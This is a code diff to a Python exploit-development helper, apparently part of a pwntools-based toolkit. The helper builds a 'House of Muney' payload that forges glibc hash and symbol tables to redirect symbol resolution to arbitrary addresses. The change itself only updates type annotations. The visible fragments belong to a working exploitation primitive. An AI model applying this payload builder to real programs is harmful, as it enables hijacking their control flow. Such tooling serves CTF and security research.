@@ -4,14 +4,8 @@ Forge the beginning of a libc mapping (.gnu.hash + .dynsym) so that lazy
 symbol resolution redirects chosen symbols to arbitrary addresses.
 """
 
-from __future__ import annotations
-
 import struct
 from collections import defaultdict
-from typing import TYPE_CHECKING, Dict
-
-if TYPE_CHECKING:
-    from pwnlib.elf.elf import ELF
 
 
 def _dl_new_hash(name: str) -> int:
@@ -22,7 +16,7 @@ def _dl_new_hash(name: str) -> int:
     return h
 
 
-def house_of_muney(glibc: "ELF", resolve: Dict[str, int]) -> bytes:
+def house_of_muney(glibc: "ELF", resolve: dict[str, int]) -> bytes:
     """Build a House of Muney payload that hijacks glibc symbol resolution.
 
     Given a pwntools ``ELF`` for the system libc and a mapping of symbol
@@ -96,7 +90,7 @@ def house_of_muney(glibc: "ELF", resolve: Dict[str, int]) -> bytes:
         dynsym_off = dynsym_sec.header.sh_addr - min_vaddr
 
         # ── locate requested symbols ────────────────────────────
-        sym_entries: Dict[str, tuple] = {}
+        sym_entries: dict[str, tuple] = {}
         for i, sym in enumerate(dynsym_sec.iter_symbols()):
             if sym.name in resolve:
                 raw = dynsym_data[i * sym_entry_size : (i + 1) * sym_entry_size]
@@ -116,7 +110,7 @@ def house_of_muney(glibc: "ELF", resolve: Dict[str, int]) -> bytes:
         payload = bytearray(payload_size)
 
         # ── group symbols by bucket for chain construction ───────
-        bucket_groups: Dict[int, list] = defaultdict(list)
+        bucket_groups: dict[int, list] = defaultdict(list)
         for name in resolve:
             idx, raw = sym_entries[name]
             new_hash = _dl_new_hash(name)
